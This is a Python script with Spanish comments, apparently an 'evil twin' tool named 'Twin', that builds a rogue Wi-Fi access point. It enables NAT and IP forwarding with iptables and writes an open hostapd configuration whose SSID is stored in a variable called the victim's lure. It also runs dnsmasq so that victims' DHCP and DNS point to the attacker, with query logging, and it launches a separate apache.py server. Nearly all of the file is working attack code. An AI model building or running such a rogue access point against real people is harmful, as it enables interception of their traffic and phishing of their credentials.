#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ LIBRERIAS ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
import tkinter as tk
from tkinter import *
from tkinter import messagebox as MessageBox
import time
import sys
import os
import subprocess 
from subprocess import Popen, PIPE, STDOUT
from io import open
import threading
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

exit=False 						#variable

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

listamenu=["Menu de Opciones:", "1--ip_table ", "2--hostapd ", "3--dnsmasq ", "4--up server", "5--exit"]#Menu Princcipal

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

def menu():

	print("\033[1;31;1m ")
	os.system('figlet    Twin')
	print("\033[1;37;1m ")
	print("            "+listamenu[0])
	print("\033[1;37;m ")
	print("            "+listamenu[1])
	print("            "+listamenu[2])
	print("            "+listamenu[3])
	print("            "+listamenu[4])
	print("            "+listamenu[5])


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_route_tables  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def config_route_tables():
	global wlan
	global ip
	os.system("ifconfig")
	wlan=input("Introduzca Wlan: ")
	ip=input("Introduzca ip interfaz: ")				
	print(wlan)
	print(ip)
	while True:
		try:
			time.sleep(0.8)
			print("#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
			print("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_route_iptables  ")
			print("&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&")
			print("Config iptables & router")
			print("Procesando")
			os.system('iptables-save > /root/dsl.fw')	
			time.sleep(0.3)
			os.system('ifconfig '+wlan+' up '+ip+' netmask 255.255.255.0')# creacion de asociacion de ip wlan0
			time.sleep(0.3)
			os.system('ip route add '+ip+' via 192.168.1.1 dev '+wlan)#ruting config
			time.sleep(0.3)
			os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE') # elige una wifi o eth0 conf_net_in
			time.sleep(0.3)
			os.system('iptables --append FORWARD --in-interface '+wlan+' -j ACCEPT')
			time.sleep(0.3)
			os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
			time.sleep(0.3)																# futuro variables rango de ip		
			os.system('iptables -t nat -L')
			print("configiracion iptable & ruting ok")
			print("#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
			print("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_route_iptables  ")
			print("&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&")			
			time.sleep(0.8)
			return wlan,ip
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_hostpad ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def configurar_hostapd(wlan):
	global Banda
	global Channel
	global name_route_victima_anzuelo
	print("Config hostapd.conf")
	print("Procesando")
	Banda=input("introduzca banda")	
	Channel=input("introduca canal")
	name_route_victima_anzuelo=input("nombre del router")	
	print(name_route_victima_anzuelo)#  nombre falso de nuestro punto wifi
	print(wlan)
	print(Banda)
	print(Channel)	
	os.system("touch /root/mis_funciones_python3/hostapd.conf")
	file1 = open("/root/mis_funciones_python3/hostapd.conf","w")
	time.sleep(0.3)
	file1.write('interface='+wlan+'\n') 
	file1.write('driver=nl80211'+'\n')
	file1.write('ssid='+name_route_victima_anzuelo+'\n')
	file1.write('hw_mode='+Banda+'\n')
	file1.write('channel='+Channel+'\n')
	file1.write('macaddr_acl=0'+'\n') # colocar seguridad wpa2 simple 
	file1.write('auth_algs=1'+'\n')
	file1.write('ignore_broadcast_ssid=0'+'\n')
	file1.close()
	time.sleep(1)
	print("ejecutando hostapd.conf y ejecutando hostapd")

	conf1=threading.Thread(target=hostapd_go, args=())
	conf1.start()
def hostapd_go(**datos):
	while True:
		try:
			proceso1=Popen(['x-terminal-emulator', '-e', 'hostapd', '/root/mis_funciones_python3/hostapd.conf'], stdout=PIPE, stderr=PIPE) 
			stdout, stderr=proceso1.communicate()	
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_dnsmasq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def configurar_dnsmasq(ip,wlan):
	print("Procesando dnsmasq")
	print(ip)	
	print(wlan)
	os.system("touch /root/mis_funciones_python3/dnsmasq.conf")
	file2 = open("/root/mis_funciones_python3/dnsmasq.conf","w")
	file2.write('interface='+wlan+'\n')
	file2.write('dhcp-range=192.168.1.1,192.168.1.25,255.255.255.0,1h'+'\n') # tipo C
	file2.write('dhcp-option=3,'+ip+'\n')
	file2.write('dhcp-option=6,'+ip+'\n')
	file2.write('server=8.8.8.8'+'\n')
	file2.write('log-queries'+'\n')
	file2.write('log-dhcp'+'\n')
	file2.write('listen-address=127.0.0.1'+'\n')
	file2.close()
	time.sleep(1)
	print("ejecutando dnsmasq.conf")													
	conf1=threading.Thread(target=dnsmasq_go, args=())
	conf1.start()
def dnsmasq_go(**datos):
	while True:
		try:
			proceso2=Popen(['x-terminal-emulator', '-e', 'dnsmasq -C /root/mis_funciones_python3/dnsmasq.conf -d'], stdout=PIPE, stderr=PIPE) 
			stdout, stderr=proceso2.communicate()	
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")



while exit==False:
	menu()
	key=(int(input("            "+"Select: ")))
	
	if (key==1):
		config_route_tables()
	elif (key==2):
		configurar_hostapd(wlan)
	elif (key==3):
		configurar_dnsmasq(ip,wlan)	
	elif (key==4):		
		os.system("python3 /root/mis_funciones_python3/apache.py")
	elif (key==5):		
		exit=True
	
print("\033[1;31;1m ")	
print("Smp_A byTe_Dey_bYte_HackiNg")
print("\033[1;31;m ")